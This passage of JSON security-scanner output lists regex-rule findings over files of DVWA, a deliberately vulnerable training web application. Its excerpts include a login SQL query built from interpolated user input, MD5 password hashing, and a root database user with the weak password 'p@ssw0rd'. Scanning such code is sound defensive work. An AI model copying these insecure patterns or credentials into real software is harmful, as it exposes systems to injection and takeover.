        "excerpt": "\n\t\t&lt;title&gt;Login :: Damn Vulnerable Web Application (DVWA) v&quot; . dvwaVersionGet() . &quot;&lt;/title&gt;\n\n\t\t&lt;link rel=\\&quot;stylesheet\\&quot; type=\\&quot;text/css\\&quot; href=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/css/login.css\\&quot; /&gt;\n\n\t&lt;/head&gt;\n\n\t&lt;body&gt;\n\n",
        "startLocationLine": 72,
        "startLocationColumn": 91,
        "endLocationLine": 72,
        "endLocationColumn": 96
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\n\t&lt;div id=\\&quot;content\\&quot;&gt;\n\n\t&lt;form action=\\&quot;login.php\\&quot; method=\\&quot;post\\&quot;&gt;\n\n\t&lt;fieldset&gt;\n\n\t\t\t&lt;label for=\\&quot;user\\&quot;&gt;Username&lt;/label&gt; &lt;input type=\\&quot;text\\&quot; class=\\&quot;loginInput\\&quot; size=\\&quot;20\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 92,
        "startLocationColumn": 17,
        "endLocationLine": 92,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n\t&lt;/fieldset&gt;\n\n\t&quot; . tokenField() . &quot;\n\n",
        "startLocationLine": 103,
        "startLocationColumn": 55,
        "endLocationLine": 103,
        "endLocationColumn": 60
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;p class=\\&quot;submit\\&quot;&gt;&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;&lt;/p&gt;\n\n\t&lt;/fieldset&gt;\n\n\t&quot; . tokenField() . &quot;\n\n",
        "startLocationLine": 103,
        "startLocationColumn": 70,
        "endLocationLine": 103,
        "endLocationColumn": 75
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT table_schema, table_name, create_time",
        "excerpt": "\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t$query = (&quot;SELECT table_schema, table_name, create_time\n\t\t\t\tFROM information_schema.tables\n\t\t\t\tWHERE table_schema=&#39;{$_DVWA[&#39;db_database&#39;]}&#39; AND table_name=&#39;users&#39;\n\t\t\t\tLIMIT 1&quot;);\n\t$result = @mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query );\n\tif( mysqli_num_rows( $result ) != 1 ) {\n",
        "startLocationLine": 29,
        "startLocationColumn": 12,
        "endLocationLine": 29,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user=&#39;$user&#39; AND password=&#39;$pass&#39;;&quot;;",
        "excerpt": "\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t}\n\n\t$query  = &quot;SELECT * FROM `users` WHERE user=&#39;$user&#39; AND password=&#39;$pass&#39;;&quot;;\n\t$result = @mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;.&lt;br /&gt;Try &lt;a href=&quot;setup.php&quot;&gt;installing again&lt;/a&gt;.&lt;/pre&gt;&#39; );\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {    // Login Successful...\n\t\tdvwaMessagePush( &quot;You have logged in as &#39;{$user}&#39;&quot; );\n\t\tdvwaLogin( $user );\n\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;index.php&#39; );\n",
        "startLocationLine": 39,
        "startLocationColumn": 12,
        "endLocationLine": 39,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t$query = (&quot;SELECT table_schema, table_name, create_time\n\t\t\t\tFROM information_schema.tables\n\t\t\t\tWHERE table_schema=&#39;{$_DVWA[&#39;db_database&#39;]}&#39; AND table_name=&#39;users&#39;\n\t\t\t\tLIMIT 1&quot;);\n",
        "startLocationLine": 27,
        "startLocationColumn": 10,
        "endLocationLine": 27,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/login.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "$messagesHtml = messagesPopAllToHtml();\n\nHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);    // HTTP/1.1\nHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );      // TODO- proper XHTML headers...\nHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );     // Date in the past\n\n// Anti-CSRF\ngenerateSessionToken();\n\n",
        "startLocationLine": 55,
        "startLocationColumn": 60,
        "endLocationLine": 55,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_source.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "\tcase &quot;csrf&quot; :\n\t\t$vuln = &#39;CSRF&#39;;\n\t\tbreak;\n\tcase &quot;exec&quot; :\n\t\t$vuln = &#39;Command Injection&#39;;\n\t\tbreak;\n\tcase &quot;sqli&quot; :\n\t\t$vuln = &#39;SQL Injection&#39;;\n\t\tbreak;\n",
        "startLocationLine": 25,
        "startLocationColumn": 8,
        "endLocationLine": 25,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_source.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] .= &#39;Source&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\n$id       = $_GET[ &#39;id&#39; ];\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_source_all.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "\tcase &quot;csrf&quot; :\n\t\t$vuln = &#39;CSRF&#39;;\n\t\tbreak;\n\tcase &quot;exec&quot; :\n\t\t$vuln = &#39;Command Injection&#39;;\n\t\tbreak;\n\tcase &quot;sqli&quot; :\n\t\t$vuln = &#39;SQL Injection&#39;;\n\t\tbreak;\n",
        "startLocationLine": 42,
        "startLocationColumn": 8,
        "endLocationLine": 42,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_source_all.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;Source&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\n$id = $_GET[ &#39;id&#39; ];\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/view_help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;Help&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\n$id       = $_GET[ &#39;id&#39; ];\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/config/config.php",
        "ruleId": "DH000003",
        "ruleName": "Config known weak",
        "ruleDescription": "Database root password",
        "pattern": "db_user.*root",
        "type": "Regex",
        "confidence": "High",
        "severity": "Important",
        "tags": [
          "Config.knownweak"
        ],
        "sample": "db_user&#39; ]     = &#39;root",
        "excerpt": "$_DVWA = array();\n$_DVWA[ &#39;db_server&#39; ]   = &#39;127.0.0.1&#39;;\n$_DVWA[ &#39;db_database&#39; ] = &#39;dvwa&#39;;\n$_DVWA[ &#39;db_user&#39; ]     = &#39;root&#39;;\n$_DVWA[ &#39;db_password&#39; ] = &#39;p@ssw0rd&#39;;\n\n# Only used with PostgreSQL/PGSQL database selection.\n$_DVWA[ &#39;db_port &#39;] = &#39;5432&#39;;\n\n",
        "startLocationLine": 20,
        "startLocationColumn": 10,
        "endLocationLine": 20,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/config/config.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "# ReCAPTCHA settings\n#   Used for the &#39;Insecure CAPTCHA&#39; module\n#   You&#39;ll need to generate your own keys at: https://www.google.com/recaptcha/admin\n$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;&#39;;\n$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;&#39;;\n\n# Default security level\n#   Default value for the security level with each session.\n#   The default is &#39;impossible&#39;. You may wish to set this to either &#39;low&#39;, &#39;medium&#39;, &#39;high&#39; or impossible&#39;.\n",
        "startLocationLine": 29,
        "startLocationColumn": 20,
        "endLocationLine": 29,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/config/config.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "#   Used for the &#39;Insecure CAPTCHA&#39; module\n#   You&#39;ll need to generate your own keys at: https://www.google.com/recaptcha/admin\n$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;&#39;;\n$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;&#39;;\n\n# Default security level\n#   Default value for the security level with each session.\n#   The default is &#39;impossible&#39;. You may wish to set this to either &#39;low&#39;, &#39;medium&#39;, &#39;high&#39; or impossible&#39;.\n$_DVWA[ &#39;default_security_level&#39; ] = &#39;impossible&#39;;\n",
        "startLocationLine": 30,
        "startLocationColumn": 20,
        "endLocationLine": 30,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/config/config.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "&lt;?php\n\n# If you are having problems connecting to the MySQL database and all of the variables below are correct\n# try changing the &#39;db_server&#39; variable from localhost to 127.0.0.1. Fixes a problem due to sockets.\n#   Thanks to @digininja for the fix.\n\n# Database management system to use\n$DBMS = &#39;MySQL&#39;;\n",
        "startLocationLine": 3,
        "startLocationColumn": 48,
        "endLocationLine": 3,
        "endLocationColumn": 53
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/config/config.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "#   Thanks to @digininja for the fix.\n\n# Database management system to use\n$DBMS = &#39;MySQL&#39;;\n#$DBMS = &#39;PGSQL&#39;; // Currently disabled\n\n# Database variables\n#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.\n#   Please use a database dedicated to DVWA.\n",
        "startLocationLine": 8,
        "startLocationColumn": 10,
        "endLocationLine": 8,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/config/config.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "$_DVWA[ &#39;db_port &#39;] = &#39;5432&#39;;\n\n# ReCAPTCHA settings\n#   Used for the &#39;Insecure CAPTCHA&#39; module\n#   You&#39;ll need to generate your own keys at: https://www.google.com/recaptcha/admin\n$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;&#39;;\n$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;&#39;;\n\n# Default security level\n",
        "startLocationLine": 27,
        "startLocationColumn": 19,
        "endLocationLine": 27,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/cookie-input.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;Blind SQL Injection Cookie Input&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\nif( isset( $_POST[ &#39;id&#39; ] ) ) {\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: SQL Injection (Blind)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;sqli_blind&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;sqli_blind&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/index.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT COUNT(*) FROM users;&quot;;",
        "excerpt": "\t\t\t\tUser ID:&quot;;\n\tif( $vulnerabilityFile == &#39;medium.php&#39; ) {\n\t\t$page[ &#39;body&#39; ] .= &quot;\\n\t\t\t\t&lt;select name=\\&quot;id\\&quot;&gt;&quot;;\n\t\t$query  = &quot;SELECT COUNT(*) FROM users;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\t\t$num    = mysqli_fetch_row( $result )[0];\n\t\t$i      = 0;\n\t\twhile( $i &lt; $num ) { $i++; $page[ &#39;body&#39; ] .= &quot;&lt;option value=\\&quot;{$i}\\&quot;&gt;{$i}&lt;/option&gt;&quot;; }\n\t\t$page[ &#39;body&#39; ] .= &quot;&lt;/select&gt;&quot;;\n",
        "startLocationLine": 63,
        "startLocationColumn": 13,
        "endLocationLine": 63,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/index.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/SQL_injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/Blind_SQL_Injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://bobby-tables.com/&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\\n&quot;;\n\n",
        "startLocationLine": 91,
        "startLocationColumn": 87,
        "endLocationLine": 91,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: File Inclusion&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;fi&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;fi&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/index.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Command Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;exec&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;exec&#39;;\n$page[ &#39;source_button&#39; ] = &#39;exec&#39;;\n\ndvwaDatabaseConnect();\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 23,
        "endLocationLine": 10,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/index.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Command Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;exec&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;exec&#39;;\n$page[ &#39;source_button&#39; ] = &#39;exec&#39;;\n\ndvwaDatabaseConnect();\n\n$vulnerabilityFile = &#39;&#39;;\n",
        "startLocationLine": 11,
        "startLocationColumn": 29,
        "endLocationLine": 11,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/index.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
